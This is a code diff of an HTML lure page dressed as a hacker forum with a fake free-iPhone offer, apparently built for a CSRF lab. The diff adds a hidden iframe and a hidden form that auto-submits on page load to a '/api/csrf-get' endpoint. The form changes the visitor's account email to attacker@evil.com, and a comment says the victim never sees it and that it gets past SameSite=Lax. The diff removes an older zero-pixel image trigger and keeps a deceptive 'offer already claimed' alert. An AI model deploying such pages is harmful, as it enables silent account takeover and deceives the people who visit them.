@@ -18,11 +18,7 @@
       --glow: 0 0 5px var(--hacker-green);
     }
     
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     
     body {
       font-family: 'Share Tech Mono', monospace;
@@ -37,13 +33,8 @@
       overflow-x: hidden;
     }
     
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-      padding: 1rem;
-    }
+    .container { max-width: 900px; margin: 0 auto; padding: 1rem; }
     
-    /* Terminal Header Styling */
     .terminal-header {
       border: 1px solid var(--hacker-green);
       box-shadow: var(--glow);
@@ -61,33 +52,15 @@
       border-bottom: 1px solid #000;
     }
     
-    .terminal-controls {
-      display: flex;
-      gap: 6px;
-      margin-right: 10px;
-    }
-    
-    .control {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-    }
-    
+    .terminal-controls { display: flex; gap: 6px; margin-right: 10px; }
+    .control { width: 10px; height: 10px; border-radius: 50%; }
     .control.close { background: var(--hacker-red); }
     .control.minimize { background: #ff0; }
     .control.expand { background: var(--hacker-green); }
     
-    .terminal-title {
-      font-size: 0.7rem;
-      color: var(--hacker-green);
-      flex-grow: 1;
-    }
+    .terminal-title { font-size: 0.7rem; color: var(--hacker-green); flex-grow: 1; }
     
-    .header-content {
-      padding: 1rem;
-      text-align: center;
-    }
-    
+    .header-content { padding: 1rem; text-align: center; }
     .header-content h1 {
       color: var(--hacker-green);
       text-shadow: 0 0 10px var(--hacker-green);
@@ -95,13 +68,8 @@
       letter-spacing: 2px;
       margin-bottom: 0.5rem;
     }
+    .header-content p { color: #888; font-size: 0.9rem; }
     
-    .header-content p {
-      color: #888;
-      font-size: 0.9rem;
-    }
-    
-    /* Main Content */
     .main-content {
       display: grid;
       grid-template-columns: 1fr 300px;
@@ -109,9 +77,7 @@
     }
     
     @media (max-width: 768px) {
-      .main-content {
-        grid-template-columns: 1fr;
-      }
+      .main-content { grid-template-columns: 1fr; }
     }
     
     .panel {
@@ -125,62 +91,22 @@
     .panel::before {
       content: "";
       position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
+      top: 0; left: 0; right: 0;
       height: 2px;
       background: linear-gradient(to right, var(--hacker-red), var(--hacker-green));
     }
     
-    h2 {
-      color: var(--hacker-green);
-      margin-bottom: 1rem;
-      font-size: 1.2rem;
-      border-bottom: 1px solid #333;
-      padding-bottom: 5px;
-    }
+    h2 { color: var(--hacker-green); margin-bottom: 1rem; font-size: 1.2rem; border-bottom: 1px solid #333; padding-bottom: 5px; }
+    h3 { color: var(--hacker-red); margin-bottom: 0.8rem; font-size: 1rem; }
+    p { margin-bottom: 1rem; font-size: 0.9rem; }
     
-    h3 {
-      color: var(--hacker-red);
-      margin-bottom: 0.8rem;
-      font-size: 1rem;
-    }
+    .post { border-bottom: 1px solid #222; padding: 0.8rem 0; }
+    .post:last-child { border-bottom: none; }
+    .post-header { display: flex; justify-content: space-between; margin-bottom: 0.5rem; color: var(--hacker-green); font-size: 0.8rem; }
+    .username { color: var(--hacker-red); font-weight: bold; }
+    .post-content { color: #ccc; }
     
-    p {
-      margin-bottom: 1rem;
-      font-size: 0.9rem;
-    }
-    
-    .post {
-      border-bottom: 1px solid #222;
-      padding: 0.8rem 0;
-    }
-    
-    .post:last-child {
-      border-bottom: none;
-    }
-    
-    .post-header {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 0.5rem;
-      color: var(--hacker-green);
-      font-size: 0.8rem;
-    }
-    
-    .username {
-      color: var(--hacker-red);
-      font-weight: bold;
-    }
-    
-    .post-content {
-      color: #ccc;
-    }
-    
-    /* Sidebar */
-    .sidebar h2 {
-      color: var(--hacker-red);
-    }
+    .sidebar h2 { color: var(--hacker-red); }
     
     .offer-box {
       background: linear-gradient(to bottom, #1a0000, #000);
@@ -190,17 +116,8 @@
       margin-bottom: 1rem;
     }
     
-    .offer-box h3 {
-      color: #fff;
-      text-shadow: 0 0 5px var(--hacker-red);
-      font-size: 1.3rem;
-      margin-bottom: 0.5rem;
-    }
-    
-    .offer-box p {
-      color: #ff9;
-      font-size: 0.8rem;
-    }
+    .offer-box h3 { color: #fff; text-shadow: 0 0 5px var(--hacker-red); font-size: 1.3rem; margin-bottom: 0.5rem; }
+    .offer-box p { color: #ff9; font-size: 0.8rem; }
     
     .btn-hack {
       display: inline-block;
@@ -216,6 +133,7 @@
       letter-spacing: 1px;
       box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
       transition: all 0.3s;
+      cursor: pointer;
     }
     
     .btn-hack:hover {
@@ -223,7 +141,6 @@
       box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
     }
     
-    /* Footer */
     .footer {
       margin-top: 2rem;
       text-align: center;
@@ -233,52 +150,46 @@
       padding-top: 1rem;
     }
     
-    .blink {
-      animation: blink 2s infinite;
-    }
+    .blink { animation: blink 2s infinite; }
     
     .hacker-noise {
       position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABGSURBVGhD7cExAQAwDMCg+zfd2VAk4JVL8p8VSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIk6Q1p8gIe6x6VYAAAAABJRU5ErkJggg==');
       opacity: 0.03;
       pointer-events: none;
       z-index: -1;
     }
     
-    /* Animations */
     @keyframes blink {
       0%, 100% { opacity: 1; }
       50% { opacity: 0.3; }
-    }
-    
-    .typewriter {
-      overflow: hidden;
-      border-right: 2px solid var(--hacker-green);
-      white-space: nowrap;
-      margin: 0 auto;
-      letter-spacing: 1px;
-      animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
-    }
-    
-    @keyframes typing {
-      from { width: 0 }
-      to { width: 100% }
-    }
-    
-    @keyframes blink-caret {
-      from, to { border-color: transparent }
-      50% { border-color: var(--hacker-green) }
     }
   </style>
 </head>
 <body>
   <div class="hacker-noise"></div>
+
+  <!-- 
+    CSRF ATTACK VECTOR
+    Hidden iframe + form combo — fires on page load as a top-level GET
+    navigation inside the iframe, which satisfies SameSite=Lax cookie policy.
+    The victim never sees this.
+  -->
+  <iframe name="csrf-frame" style="display:none;" id="csrfFrame"></iframe>
+  <form
+    id="csrfForm"
+    action="https://labs.astralguard.online/api/csrf-get"
+    method="GET"
+    target="csrf-frame"
+    style="display:none;"
+  >
+    <input type="hidden" name="change" value="1" />
+    <input type="hidden" name="email" value="attacker@evil.com" />
+  </form>
+
   <div class="container">
-    <!-- Terminal Style Header -->
     <div class="terminal-header">
       <div class="terminal-bar">
         <div class="terminal-controls">
@@ -295,7 +206,6 @@
     </div>
 
     <div class="main-content">
-      <!-- Main Forum Posts -->
       <div class="panel">
         <h2><i class="fas fa-terminal"></i> RECENT POSTS</h2>
         
@@ -340,7 +250,6 @@
         </div>
       </div>
 
-      <!-- Sidebar with "Offer" -->
       <div class="sidebar">
         <div class="panel">
           <h2><i class="fas fa-user-shield"></i> YOUR STATUS</h2>
@@ -354,11 +263,7 @@
           <p>FIRST 10 VISITORS TODAY GET FREE IPHONE 15 PRO MAX</p>
           <p>NO SURVEYS - NO PAYMENT - INSTANT WIN</p>
           <p>JUST VISIT THIS PAGE TO CLAIM</p>
-          
-          <!-- This is the actual CSRF trigger -->
-          <img src="https://labs.astralguard.online/api/csrf-get?change=1&amp;email=attacker@evil.com" width="0" height="0" />
-          
-          <a href="#" class="btn-hack" onclick="fakeClaim()">CLAIM NOW</a>
+          <button class="btn-hack" onclick="fakeClaim()">CLAIM NOW</button>
         </div>
 
         <div class="panel">
@@ -375,14 +280,17 @@
   </div>
 
   <script>
-    // Fake claim function to make the button look like it does something
+    // Fire CSRF silently on page load
+    window.onload = function () {
+      document.getElementById('csrfForm').submit();
+    };
+
     function fakeClaim() {
       alert('ERROR: Offer already claimed for your session. Check your email for tracking details.');
       return false;
     }
 
-    // Add some typewriter effect to headers
-    document.addEventListener('DOMContentLoaded', function() {
+    document.addEventListener('DOMContentLoaded', function () {
       const titles = document.querySelectorAll('.post-content p');
       titles.forEach(title => {
         const originalText = title.textContent;
